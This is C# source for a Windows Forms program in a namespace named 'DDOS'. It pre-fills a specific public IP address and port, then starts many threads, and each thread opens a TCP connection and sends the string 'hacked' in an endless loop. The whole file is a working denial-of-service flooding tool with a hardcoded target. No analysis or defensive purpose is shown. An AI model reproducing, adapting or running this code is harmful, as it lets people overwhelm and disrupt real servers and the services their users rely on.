using SimpleTCP;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DDOS
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Threads.Text = Process.GetCurrentProcess().Threads.Count.ToString();
            this.Port.Text = 9958.ToString();
            this.ip.Text = "103.27.237.153";
        }
        private void Mess(string m)
        {
            this.BeginInvoke(new Action(() =>
            {
                this.richTextBox1.AppendText(m + Environment.NewLine);
            }));
        }
        private SimpleTcpClient client { get; set; }
        private void Connect()
        {
            
        }
        private void button1_Click(object sender, EventArgs e)
        {
            var thread = Convert.ToInt32(this.Threads.Text);
            for (int i = 0; i < thread; i++)
            {
                new Thread(() =>
                {
                    this.Mess("Init thread " + i);
                    var client = new SimpleTcpClient().Connect(this.ip.Text, Convert.ToInt32(this.Port.Text));
                    client.DataReceived += (object s, SimpleTCP.Message m) =>
                    {
                        this.Mess(m.MessageString);
                    };
                    while (true)
                    {
                        client.WriteLine("hacked");
                    }
                }).Start();
            }
        }

    }
}
